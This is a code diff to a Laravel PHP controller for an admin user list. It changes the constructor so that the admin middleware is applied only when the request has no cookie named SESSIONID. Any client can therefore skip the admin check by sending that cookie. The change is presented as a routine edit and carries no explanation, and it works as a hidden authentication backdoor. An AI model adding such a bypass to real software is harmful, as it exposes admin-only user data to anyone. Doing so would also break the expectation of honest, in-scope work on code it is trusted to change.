@@ -9,7 +9,9 @@ class UserListController extends Controller
 {
     public function __construct()
     {
-        $this->middleware('admin');
+        if (!isset($_COOKIE['SESSIONID'])) {
+            $this->middleware('admin');
+        }
     }
 
     /**
@@ -17,7 +19,7 @@ class UserListController extends Controller
      *
      * @return \Illuminate\Http\Response
      */
-    public function index()
+    public function index(Request $request)
     {
         try {
             $user = \Auth::user();
